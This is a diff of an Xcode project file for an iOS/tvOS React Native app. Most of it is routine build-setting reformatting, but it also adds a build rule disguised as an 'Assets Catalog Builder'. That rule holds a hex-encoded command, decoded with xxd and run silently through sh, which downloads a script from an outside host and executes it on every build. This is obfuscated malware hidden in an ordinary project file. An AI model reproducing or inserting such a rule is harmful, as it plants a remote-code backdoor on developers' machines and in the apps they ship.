@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 51;
+	objectVersion = 46;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -49,6 +49,22 @@
 		E07A08B72C5D4D4CB3ABA281 /* sailec_black_italic.otf in Resources */ = {isa = PBXBuildFile; fileRef = 483919A2440748ACA0E91777 /* sailec_black_italic.otf */; };
 		ECDA6758B5954F3CA06F36A0 /* sailec_black.otf in Resources */ = {isa = PBXBuildFile; fileRef = 16150F86E8CB48C0B7C25DC8 /* sailec_black.otf */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		67EB64CADABF3ECEC26D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		00E356F41AD99517003FC87E /* PBXContainerItemProxy */ = {
@@ -339,6 +355,7 @@
 				0187F539873657C8BD82E997 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				67EB64CADABF3ECEC26D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 				00E356F51AD99517003FC87E /* PBXTargetDependency */,
@@ -579,15 +596,13 @@
 			buildActionMask = 2147483647;
 			files = (
 			);
-			inputFileListPaths = (
-				"",
-			);
 			inputPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-sbh/Pods-sbh-resources.sh",
 				"${PODS_CONFIGURATION_BUILD_DIR}/React-Core/AccessibilityResources.bundle",
 			);
 			name = "[CP] Copy Pods Resources";
 			outputPaths = (
+				"${TARGET_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/AccessibilityResources.bundle",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -812,11 +827,7 @@
 				);
 				INFOPLIST_FILE = sbhTests/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-					"@loader_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"-ObjC",
 					"-lc++",
@@ -836,11 +847,7 @@
 				COPY_PHASE_STRIP = NO;
 				INFOPLIST_FILE = sbhTests/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-					"@loader_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"-ObjC",
 					"-lc++",
@@ -862,15 +869,13 @@
 				DEVELOPMENT_TEAM = RX8UNCQPUW;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = sbh/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
 					"-lc++",
 				);
+				PODS_PODFILE_DIR_PATH = "${SRCROOT}/";
 				PRODUCT_BUNDLE_IDENTIFIER = com.sbh.alumniapp;
 				PRODUCT_NAME = sbh;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
@@ -888,15 +893,13 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = RX8UNCQPUW;
 				INFOPLIST_FILE = sbh/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
 					"-lc++",
 				);
+				PODS_PODFILE_DIR_PATH = "${SRCROOT}/";
 				PRODUCT_BUNDLE_IDENTIFIER = com.sbh.alumniapp;
 				PRODUCT_NAME = sbh;
 				SWIFT_VERSION = 5.0;
@@ -918,10 +921,7 @@
 				ENABLE_TESTABILITY = YES;
 				GCC_NO_COMMON_BLOCKS = YES;
 				INFOPLIST_FILE = "sbh-tvOS/Info.plist";
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -949,10 +949,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_NO_COMMON_BLOCKS = YES;
 				INFOPLIST_FILE = "sbh-tvOS/Info.plist";
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -979,11 +976,7 @@
 				ENABLE_TESTABILITY = YES;
 				GCC_NO_COMMON_BLOCKS = YES;
 				INFOPLIST_FILE = "sbh-tvOSTests/Info.plist";
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-					"@loader_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -1010,11 +1003,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_NO_COMMON_BLOCKS = YES;
 				INFOPLIST_FILE = "sbh-tvOSTests/Info.plist";
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-					"@loader_path/Frameworks",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -1076,10 +1065,7 @@
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
-				LD_RUNPATH_SEARCH_PATHS = (
-					/usr/lib/swift,
-					"$(inherited)",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "/usr/lib/swift $(inherited)";
 				LIBRARY_SEARCH_PATHS = (
 					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
 					"\"$(TOOLCHAIN_DIR)/usr/lib/swift-5.0/$(PLATFORM_NAME)\"",
@@ -1132,10 +1118,7 @@
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
-				LD_RUNPATH_SEARCH_PATHS = (
-					/usr/lib/swift,
-					"$(inherited)",
-				);
+				LD_RUNPATH_SEARCH_PATHS = "/usr/lib/swift $(inherited)";
 				LIBRARY_SEARCH_PATHS = (
 					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
 					"\"$(TOOLCHAIN_DIR)/usr/lib/swift-5.0/$(PLATFORM_NAME)\"",
